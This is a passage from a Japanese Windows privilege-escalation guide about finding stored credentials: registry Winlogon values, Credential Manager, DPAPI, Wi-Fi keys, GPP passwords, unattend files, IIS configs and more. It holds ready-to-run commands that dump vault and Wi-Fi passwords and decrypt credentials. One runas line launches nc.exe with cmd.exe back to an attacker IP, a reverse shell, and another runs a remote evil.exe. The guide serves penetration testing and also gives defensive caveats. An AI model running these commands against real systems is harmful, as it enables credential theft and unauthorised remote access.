WSL 内の Linux `root` であることだけでは、Windows の Administrator 権限は得られません。現在の Windows ID でディストリビューションのファイルシステムを読み取れる場合は、認証情報が記録されている可能性のあるコマンドを探すため、`/root/.bash_history` を含むシェル履歴ファイルを確認してください。権限昇格には、引き続き、より高い権限を持つ有効なアカウントと、許可された認証経路が必要です。`LocalState\rootfs` の構成は古い WSL インストールに適用されます。WSL 2 では、一般にディストリビューションは [`ext4.vhdx` 仮想ディスク](https://learn.microsoft.com/en-us/windows/wsl/disk-space) に保存されるため、まず実際のディストリビューションと保存先のパスを特定してください。自動列挙中に履歴の内容を表示するのは避けてください。

## Windows の認証情報

### Winlogon の認証情報

```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr /i "DefaultDomainName DefaultUserName DefaultPassword AltDefaultDomainName AltDefaultUserName AltDefaultPassword LastUsedUsername"

#Other way
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultDomainName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultUserName
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v AltDefaultPassword
```

`DefaultUserName` と `DefaultDomainName` は認証情報ではなく、アカウントのコンテキストとして扱ってください。`DefaultPassword` または `AltDefaultPassword` に空でない値があれば、レジストリに平文のパスワードが保存されていることを示します。`AutoAdminLogon=1` でも、平文のパスワードを読み取れない場合は手掛かりに過ぎません。[Sysinternals Autologon はパスワードを LSA secret として保存することがあります](https://learn.microsoft.com/en-us/sysinternals/downloads/autologon)。通常のレジストリ読み取りだけでは、その secret が存在するか、取得可能かどうかは確認できません。認証情報の露出を報告する前に、アクセス権と実際のログオン設定を確認してください。

### Credential Manager / Windows Vault

[https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)<sup>[[34]](#references)</sup> より\
Windows Vault には、**Windows** が**ユーザーの自動ログインに使用できる**サーバー、Webサイト、その他のプログラム用のユーザー認証情報が保存されます。最初は、Facebook、Twitter、Gmail などのサイト用認証情報を保存して、ブラウザーで自動ログインできるようにするものと思えるかもしれませんが、実際はそうではありません。

Windows Vault には、Windows がユーザーを自動的にログインさせるための認証情報が保存されます。つまり、リソース（サーバーまたは Web サイト）へのアクセスに認証情報が必要な**Windows アプリケーションは、この Credential Manager と Windows Vault を利用し**、ユーザーが毎回ユーザー名とパスワードを入力する代わりに、保存された認証情報を使用できます。

アプリケーションが Credential Manager と連携しない限り、特定のリソース用の認証情報を利用することはできないと思います。そのため、アプリケーションで vault を利用するには、何らかの方法で**Credential Manager と通信し、既定のストレージ vault からそのリソース用の認証情報を要求する**必要があります。

`cmdkey` を使って、マシンに保存されている認証情報を一覧表示します。

```bash
cmdkey /list
Currently stored credentials:
 Target: Domain:interactive=WORKGROUP\Administrator
 Type: Domain Password
 User: WORKGROUP\Administrator
```

その後、`/savecred` オプションを指定して `runas` を使い、保存された認証情報を使用できます。次の例では、SMB share 経由でリモートのバイナリを呼び出しています。

```bash
runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
```

提供された資格情報を使って`runas`を実行する。

```bash
C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"
```

mimikatz、lazagne、[credentialfileview](https://www.nirsoft.net/utils/credentials_file_view.html)、[VaultPasswordView](https://www.nirsoft.net/utils/vault_password_view.html)、または[Empire Powershells module](https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/dumpCredStore.ps1)を使用してください。

### UWP PasswordVault / Credential Locker

最新のWindows UWPアプリケーション、Microsoft Edge、および最新のシステムサービスは、認証トークンと平文パスワードをUniversal Windows Platform（UWP）の`PasswordVault`（`vaultcmd`では`Web Credentials`としても表示されます）内に保存します。このストレージ領域はセッションごとに分離されており、管理者権限や`SeDebugPrivilege`なしでネイティブに復号できます。

ユーザーのアクティブなセッション内で次のPowerShellコマンドを実行すると、保存されているすべてのユーザー名と平文パスワードを即座にダンプして復号できます。

```ps1
[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]; $v = New-Object Windows.Security.Credentials.PasswordVault; $v.RetrieveAll() | ForEach-Object { try { $_.RetrievePassword(); $_ } catch {} } | Select-Object Resource, UserName, Password | Format-List
```

### DPAPI

**Data Protection API（DPAPI）**は、データを対称暗号化する方法を提供します。主に Windows オペレーティングシステム内で、非対称秘密鍵を対称暗号化するために使用されます。この暗号化では、ユーザーまたはシステムの秘密情報を利用して、エントロピーを大幅に高めます。

**DPAPIでは、ユーザーのログイン秘密情報から導出された対称鍵を使って鍵を暗号化できます**。システム暗号化の場合は、システムのドメイン認証情報を使用します。

DPAPIを使用して暗号化されたユーザーのRSA鍵は、`%APPDATA%\Microsoft\Protect\{SID}`ディレクトリに保存されます。ここで`{SID}`は、ユーザーの[セキュリティ識別子](https://en.wikipedia.org/wiki/Security_Identifier)を表します。**同じファイル内にある、ユーザーの秘密鍵を保護するマスターキーとともに格納されるDPAPI鍵**は、通常64バイトのランダムデータで構成されます。（このディレクトリへのアクセスは制限されているため、CMDの`dir`コマンドでは内容を一覧表示できませんが、PowerShellでは一覧表示できます。）

```bash
Get-ChildItem  C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem  C:\Users\USER\AppData\Local\Microsoft\Protect\
```

**mimikatz module** `dpapi::masterkey` を適切な引数（`/pvk` または `/rpc`）とともに使用すると、復号できます。

**マスターパスワードで保護された認証情報ファイル**は、通常、次の場所にあります。

```bash
dir C:\Users\username\AppData\Local\Microsoft\Credentials\
dir C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

**mimikatz module** `dpapi::cred` と適切な `/masterkey` を使って復号できます。\
（root 権限があれば）`sekurlsa::dpapi` module を使って、**メモリ**から多数の DPAPI **masterkeys**を**抽出**できます。


{{#ref}}
dpapi-extracting-passwords.md
{{#endref}}

### PowerShell 認証情報

**PowerShell credentials**は、暗号化された認証情報を手軽に保存する方法として、**スクリプト**や自動化タスクでよく使われます。認証情報は**DPAPI**で保護されているため、通常は作成時と同じコンピューター上の同じユーザーのみが復号できます。

エクスポートされた認証情報のファイル名や`.xml`のパスは任意です。スクリプトやファイルのインベントリからファイルが見つかった場合は、`C:\Users`にあると決めつけず、アカウントの実際のプロファイルディレクトリを特定してください。[Windowsではプロファイルを別の場所に配置できます](https://learn.microsoft.com/en-us/windows/win32/shell/profiles-directory)。ファイルを読み取れることは手掛かりにすぎません。[Windowsの`Export-Clixml`は、暗号化された認証情報をエクスポートしたユーザーとコンピューターに紐付けます](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/export-clixml)。また、復旧したアカウントが対象サービスに対する有効な権限を持つかどうかは、別途確認する必要があります。通常の列挙では、暗号化された値や平文の値を表示せず、まずパスとACLを確認してください。

ファイルに含まれるPS credentialsを**復号**するには、次のようにします。

```bash
PS C:\> $credential = Import-Clixml -Path 'C:\pass.xml'
PS C:\> $credential.GetNetworkCredential().username

john

PS C:\htb> $credential.GetNetworkCredential().password

JustAPWD!
```

### Wi-Fi

```bash
#List saved Wifi using
netsh wlan show profile
#To get the clear-text password use
netsh wlan show profile <SSID> key=clear
#Oneliner to extract all wifi passwords
cls & echo. & for /f "tokens=3,* delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name="%b" key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on*
```

### 保存済みRDP接続

`HKEY_USERS\<SID>\Software\Microsoft\Terminal Server Client\Servers`\  
および `HKCU\Software\Microsoft\Terminal Server Client\Servers\` にあります。

### 最近実行したコマンド

```
HCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
HKCU\<SID>\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU
```

### **リモート デスクトップ資格情報マネージャー**

```
%localappdata%\Microsoft\Remote Desktop Connection Manager\RDCMan.settings
```

**Mimikatz** の `dpapi::rdg` module を適切な `/masterkey` とともに使用して、**任意の .rdg ファイルを復号**します。\
Mimikatz の `sekurlsa::dpapi` module を使うと、メモリから**多数の DPAPI masterkey を抽出**できます。

**mRemoteNG は異なる接続ストアを使用します。** `%APPDATA%\mRemoteNG` とユーザーの Documents にある、`config.xml` のような一般的な名前のファイルを含む、読み取り可能な XML を調べます。XML ファイルを認証情報の手掛かりとして扱う前に、接続スキーマと暗号化された `Password` 属性を特定してください。保存された値は DPAPI/RDCMan のパスワードではありません。復旧できるかどうかは、ファイルの暗号化設定とカスタム master password が使用されたかどうかによります。広範な列挙中に暗号化された値を出力しないでください。

**Remote Desktop Plus のプロファイルエクスポート**も、ユーザーディレクトリや共有管理フォルダー内に読み取り可能な状態で保存されている場合があります。旧形式の `profiles.xml` エクスポートには、`ProfileName`、`Password`、`Secure` 要素を含む `Data/Profile` エントリがあります。値が空でないパスワード要素は、出力したり平文だと決めつけたりせず、認証情報の手掛かりとして扱ってください。[ベンダーの説明](https://www.donkz.nl/)によると、プロファイルの保護は作成時のアカウントとコンピューターに紐付けられている場合も、より緩い設定になっている場合もあります。利用する前に、ファイルの出所と復旧条件を確認してください。

### Sticky Notes

Windows ワークステーションでは、データベースファイルだと気づかずに、StickyNotes アプリにパスワードやその他の情報を**保存**している人がよくいます。このファイルは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` にあり、必ず検索して調べる価値があります。

Sticky Notes アプリにパスワードやその他の情報を保存している人もいます。Microsoft のパッケージ版 Sticky Notes アプリでは、通常、ノートは `C:\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite` に保存されます。旧バージョンや別のアプリでは、LevelDB など、ユーザープロファイル内の別のストアが使われる場合があります。SQLite ファイルが見つからないことを、ノートが存在しない根拠として扱う前に、インストールされているアプリとストレージ形式を特定してください。

Sticky Notes が SQLite write-ahead logging を使用している場合、`plum.sqlite` だけをコピーすると、最近コミットされたノートが含まれないことがあります。データベースの一貫性のあるコピーとともに対応する `plum.sqlite-wal` を保持し、利用できる場合は `plum.sqlite-shm` も含めてください。共有メモリのインデックスは再構築できますが、WAL はデータベースの永続状態の一部です。[SQLite の WAL ドキュメント](https://www.sqlite.org/wal.html)を参照してください。アカウント名やパスワードを含むノートは、あくまで認証情報の手掛かりです。アカウント、許可されたアクセス、およびパスワードの使い回しは、それぞれ別途確認してください。暗号化されたパスワードマネージャーのレコードを、より高い権限でのログインの証拠とするには、実際の復号キーとアプリケーション固有の解釈も必要です。

### AppCmd.exe

**AppCmd.exe からパスワードを復旧するには、Administrator 権限が必要で、High Integrity level で実行する必要があることに注意してください。**\
**AppCmd.exe** は `%systemroot%\system32\inetsrv\` ディレクトリにあります。\
このファイルが存在する場合、一部の**認証情報**が設定されており、**復旧**できる可能性があります。

このコードは [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) から抽出されました。

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

`C:\Windows\CCM\SCClient.exe` が存在するか確認します。\
インストーラーは **SYSTEM 権限で実行され**、多くは **DLL Sideloading（情報元:** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**）。**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## ファイルとレジストリ（認証情報）

### サポートツールのレジストリに残る認証情報の痕跡

一部の古いリモートサポート製品では、固定のアプリケーションレジストリキーにパスワード関連の値名が残っています。たとえば、[ベンダーによるレジストリキーの説明](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988)によると、TeamViewerの`SecurityPasswordAES`は、バージョン9より前では設定済みの静的セッションパスワードを示していました。値名の目印はあくまで確認の手がかりです。その認証情報を評価する前に、インストール済みバージョン、読み取り可能な値データ、その形式、現在の認証動作を確認してください。リモートサポートのパスワードから、より権限の高いWindowsアカウントへ至るには、実際にパスワードが再利用されていることと、そのアカウントに対する認可が別途必要です。通常の列挙出力に暗号文や復元したパスワードを含めないでください。

### 保護されたシートを含む共有スプレッドシート

読み取り可能な共有ブックにアカウント情報が含まれている疑いがある場合は、**ファイルの暗号化**と、ワークシートの保護や非表示列を区別してください。[Microsoftによると](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel)、ワークシートの保護は編集を制御するものであり、セキュリティ機能ではありません。それだけではブックの内容が暗号化されているとはいえません。許可された関連ファイルだけを確認し、広範な列挙中に認証情報の候補を出力しないでください。読み取り可能な`.xlsx`のパス、保護されたシート、非表示列だけでは、認証情報の存在や、いずれかのアカウントがより高い権限を持つことの証明にはなりません。実際のデータと現在のアカウント権限は、それぞれ別途確認してください。

### CIサーバーに残る変更パッチ

CIサーバーは、ビルド完了後も送信されたソース変更をデータディレクトリに保持している場合があります。[TeamCityのドキュメント](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html)では、`system/changes`をリモート実行の変更の保存場所としています。データディレクトリは設定可能であり、必ずしも`ProgramData`配下とは限りません。読み取り可能なパッチには、認証情報ファイル、暗号化キー、または両方を使用するスクリプトへの参照が、削除または追加された形で残っている場合があります。たとえば、PowerShellの`ConvertTo-SecureString -Key`のワークフローでは、暗号化された文字列だけでなくAESキーも必要です。[Microsoftのドキュメント](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring)では、キーは別途指定すると説明されています。まずアクセス可能なパッチの名前だけを確認し、その後、認可の範囲内で関連する内容を調べてください。通常の列挙出力に秘密情報を含めないでください。パッチのパス、暗号化された値、キーへの参照だけでは、有効な認証情報や高権限アクセスの証明にはなりません。データディレクトリのACLを制限し、ビルド変更に秘密情報をコミットしないでください。

### カスタムのローカル管理者パスワードローテーション

自作のパスワードローテーターは、暗号化されたローカル管理者パスワードをローカルサービスに保存しながら、データストアの認証情報を読み取り可能な`.env`ファイルやアップデーターのバイナリの隣に置いている場合があります。アップデーターのスケジュールされたタスク、アカウント、設定のACL、リスナー、データストアの権限をまとめて確認してください。ループバックのみで待ち受けるデータストアでも、有効な認証情報を持つローカルユーザーから到達できます。ただし、認証に成功しただけでは、関連レコードの読み取り権限があるとは限りません。暗号化シードやキー素材が暗号文の隣からアクセスできる場合は、暗号化を信頼する前に、正確な鍵導出方法を確認してください。公開されたシードからGoの[`math/rand`](https://pkg.go.dev/math/rand)を使ってAESキーを決定論的に導出する方式は、そのパスワードの保護には不適切です。Goのドキュメントでも、このパッケージはセキュリティ上重要な乱数生成には適さないとされています。復元したパスワードを権限昇格経路と見なす前に、現在も有効であり、ローカルのAdministratorsグループに属するアカウントのものか確認してください。スケジュールされたタスク、`.env`のパス、暗号化されたデータだけでは、これらの条件のいずれも証明できません。通常の列挙出力にパスワードやキー素材を含めないでください。

管理対象のローカル管理者パスワードには[Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview)を使用してください。ディレクトリまたはEntraを基盤とした保存先とアクセス制御は、カスタムのローカルデータストアとは異なります。同様に、[Elasticsearchのロール](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/)によって、認証済みのデータストアユーザーが特定のインデックスを読み取れるかどうかが決まります。

### Javaサーバープラグインのアーカイブと認証情報の再利用

一部のJavaサーバープラグインは、サーバーの`plugins`ディレクトリにJARアーカイブとして配布されています。読み取り可能なカスタムプラグインには、サービス認証情報が埋め込まれた設定やバイトコードが含まれている場合があります。認可されている場合に限りアーカイブを確認し、復元した秘密情報を通常の列挙出力に含めないでください。プラグインのパスだけでは秘密情報の存在は証明されず、復元したサービスパスワードによって高い権限が得られるのは、より権限の高いアカウントでもそのパスワードが有効な場合に限られます。関連ファイルのACLを確認し、再利用された認証情報は個別の秘密情報に置き換えてください。ディレクトリ構成については[PaperMCのプラグインインストールガイド](https://docs.papermc.io/paper/adding-plugins/)、アーカイブの内容については[OracleのJARドキュメント](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html)を参照してください。

### Openfireの組み込みデータベース認証情報

組み込みデータベースを使用するOpenfireのインストール環境では、`Openfire\embedded-db`に`openfire.script`が保存されている場合があります。現在のアカウントで読み取り可能な場合は、`OFUSER`レコードと`passwordKey`プロパティを合わせて確認してください。Openfireの[ユーザープロバイダードキュメント](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html)によると、パスワードは平文で保存することも、そのプロパティに保持されるキーで暗号化することもできます。復元したパスワードが権限昇格に関係するのは、より権限の高いIDに対しても有効な場合に限られます。ファイル名だけでは、読み取りアクセスも認証情報の再利用も証明されません。このパスはインベントリ確認の手がかりです。通常の列挙出力にデータベースの内容や認証情報を含めないでください。

別のファイルである`Openfire\conf\openfire.xml`には、外部データベースを使用していても、管理コンソールに設定されたポートとバインドインターフェースが記載されている場合があります。Openfireの管理コンソールは通常ループバックにバインドされますが、リスナーが稼働していれば、ローカルアカウントからそのアドレスにアクセスできます。実際のリスナー、認可された管理者ロール、プラグインのアップロードポリシー、Openfireサービスの実行IDを併せて確認してください。プラグインをインストールできる管理者は、サービスのコンテキストでプラグインコードを実行させることができます。サービスがLocalSystemとして実行されている場合、この権限は非常に高いものになり得ます。一致するアカウントパスワードや読み取り可能な設定パスだけでは、管理コンソールへのアクセスやコード実行の証明にはなりません。ベンダーの[インストールおよびプラグイン管理ガイド](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html)と[プラグインアップロードAPIのプロパティ](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html)を参照してください。

### フォレンジック管理サーバーの設定

Velociraptorサーバーの設定ファイルは、一般に`server.config.yaml`という名前で、内部CAの`CA.private_key`を含む場合があります。権限の低いユーザーがそのキーを読み取れる場合、APIクライアント証明書を発行できる可能性があります。それによって権限が高まるかどうかは、サーバーのユーザーロール、APIへの到達性、サーバーまたは対象エージェントが実行されるIDによります。クライアント設定には異なる情報が含まれます。クライアント設定が見つかっても、サーバーCAへのアクセスがあるとは限りません。CA秘密鍵をオフラインで保管する構成もあるため、読み取り可能なサーバー設定に署名キーが含まれていないこともあります。

Windowsサーバーでは、インストールディレクトリ内の**サーバー**設定ファイルと、保護されたバックアップのACLを確認してください。場所の例は`%ProgramFiles%\VelociraptorServer\server.config.yaml`です。異なる場合は、サービスに設定されたパスを使用してください。現在のIDでファイルを読み取れること、および`CA.private_key`が実際に含まれていることを確認してください。ログや列挙出力に秘密鍵を出力しないでください。ベンダーの`config api_client`ワークフローではCAキーを使ってクライアント証明書を発行しますが、有効なサーバー側ロールも必要です。ロールの作成や変更には、データストアへの書き込み権限または再起動が必要な場合があります。これらの書き込みができなくても、既存の特権サーバーIDが経路となる可能性があります。実行権限を持つAPIクエリは、関連するサーバーまたはエージェントのコンテキストで実行されるため、非常に高い権限を持つ場合があります。

サーバー設定とバックアップは制限的なACLで保護し、可能な場合はCA署名キーをオフラインで保管し、APIロールとリスナーへのアクセスを制限してください。[Velociraptor APIドキュメント](https://docs.velociraptor.app/docs/server_automation/server_api/)と[セキュリティ設定ガイダンス](https://docs.velociraptor.app/docs/deployment/security/)を参照してください。

### PuTTYの認証情報

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTYは独立したセッションマネージャーです。ネイティブの暗号化ストアは`%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`にある場合があります。一方、エクスポートされたセッションのバックアップは`sessions-backup.dat`という名前で、別の場所に保存されていることがあります。[SolarWindsのエクスポートガイド](https://thwack.solarwinds.com/discussion/comment/115591)によると、エクスポートデータはパスワードで暗号化され、セッション、キー、スクリプト、タグ、関連情報が含まれる場合があります。[サポートフォーラム](https://thwack.solarwinds.com/discussion/4520/saved-session-lost)では、ネイティブストアの場所が示されています。まずファイルの権限とパスを確認してください。どちらかのファイルが見つかっても、パスワードが判明するわけではなく、保存された認証情報が今も有効であることや、より高い権限を持つことの証明にもなりません。

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### レジストリ内の SSH キー

SSH の秘密鍵はレジストリキー `HKCU\Software\OpenSSH\Agent\Keys` に保存されている場合があるため、ここに興味深いものがないか確認してください。

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

そのパス内にエントリが見つかった場合、保存された SSH key である可能性が高いです。暗号化されていますが、[https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) を使って簡単に復号できます。\
この手法の詳細はこちら: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

`ssh-agent` サービスが実行されておらず、起動時に自動で開始するようにしたい場合は、次を実行します:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> この手法はもう有効ではないようです。sshキーを作成し、`ssh-add`で追加して、ssh経由でマシンにログインしようとしました。レジストリHKCU\Software\OpenSSH\Agent\Keysは存在せず、procmonでも非対称鍵認証中に`dpapi.dll`の使用は確認できませんでした。

### 無人インストールファイル

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

これらのファイルは **metasploit** を使って検索することもできます: _post/windows/gather/enum_unattend_

内容例:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM & SYSTEM のバックアップ

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

読み取り可能な Windows Imaging (`.wim`) バックアップファイルには、オフラインの `SAM`、`SECURITY`、`SYSTEM` ハイブが含まれている場合もあります。ローカルからアクセスできるバックアップやイメージのディレクトリを優先し、何かを抽出する前にイメージの**メンバー名**を確認してください。`.wim` というファイル名だけではハイブが露出しているとは限らず、一般的な `install.wim`、`boot.wim`、リカバリーイメージは誤検出の原因になりがちです。SMB share は別のアクセス経路であり、その share が対象範囲に含まれる場合にのみ確認してください。Microsoft の [Windows image guidance](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) と [registry hive file reference](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives) を参照してください。

### クラウド認証情報

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

**SiteList.xml**という名前のファイルを検索します。

### Cached GPP Password

以前は、グループポリシーの基本設定（GPP）を使用して、複数のマシンにカスタムのローカル管理者アカウントを展開できる機能がありました。しかし、この方法には重大なセキュリティ上の欠陥がありました。まず、SYSVOLにXMLファイルとして保存されているグループポリシーオブジェクト（GPO）は、すべてのドメインユーザーがアクセスできました。さらに、AES256で暗号化されたGPP内のパスワードは、公開されているデフォルトキーを使って、認証済みのユーザーなら誰でも復号できました。これにより、ユーザーが昇格した権限を取得する可能性があり、深刻なリスクが生じていました。

このリスクを軽減するため、空でない「cpassword」フィールドを含む、ローカルにキャッシュされたGPPファイルをスキャンする関数が開発されました。このようなファイルが見つかると、関数はパスワードを復号し、カスタムのPowerShellオブジェクトを返します。このオブジェクトには、GPPの詳細とファイルの場所が含まれており、このセキュリティ上の脆弱性の特定と修正に役立ちます。

`C:\ProgramData\Microsoft\Group Policy\history` または _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history**（W Vistaより前）_ で、次のファイルを検索します。

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**cPasswordを復号するには：**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

crackmapexecを使用してパスワードを取得する:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

認証情報を含む web.config の例:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### IIS webroot 内のバックアップアーカイブ

